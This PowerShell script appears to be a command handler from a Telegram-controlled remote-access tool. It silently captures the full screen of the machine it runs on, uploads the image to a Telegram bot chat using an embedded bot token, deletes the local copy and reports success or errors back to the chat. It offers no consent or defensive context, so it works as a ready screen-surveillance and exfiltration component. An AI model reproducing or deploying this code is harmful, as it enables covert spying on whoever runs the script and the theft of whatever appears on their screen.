param(
    [Parameter(Mandatory=$true)]
    [string]$chatId,
    [Parameter(Mandatory=$true)]
    [string]$message,
    [Parameter(Mandatory=$false)]
    [string]$commandArgs
)




try {
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $ScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
    $ScreenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
    $Left = [Math]::Max(0, ($ScreenWidth - $Width) / 2)
    $Top = [Math]::Max(0, ($ScreenHeight - $Height) / 2)
    $Width = [Math]::Min($Width, $ScreenWidth)
    $Height = [Math]::Min($Height, $ScreenHeight)
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $screenshotPath = Join-Path -Path $PSScriptRoot -ChildPath "screenshot.png"
    $bitmap.Save($screenshotPath)
    $graphics.Dispose()
    $bitmap.Dispose()

    $fileUrl = "https://api.telegram.org/bot$script:botToken/sendPhoto"
    $fileBinary = [System.IO.File]::ReadAllBytes($screenshotPath)
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`"",
        "",
        $chatId,
        "--$boundary",
        "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
        "Content-Type: image/png",
        "",
        [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileBinary),
        "--$boundary--"
    ) -join $LF
    
    $contentType = "multipart/form-data; boundary=$boundary"
    
    $response = Invoke-RestMethod -Uri $fileUrl -Method Post -ContentType $contentType -Body $bodyLines
    Send-TelegramMessage -chatId $chatId -message "Screenshot taken successfully."
    
    Remove-Item -Path $screenshotPath -Force
}
catch {
    Send-TelegramMessage -chatId $chatId -message "Error taking screenshot: $($_.Exception.Message)"
    if ($_.Exception.Response) {
        $responseBody = $_.Exception.Response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($responseBody)
        $responseText = $reader.ReadToEnd()
        Write-Host "Response detail: $responseText" -ForegroundColor Red
    }
}
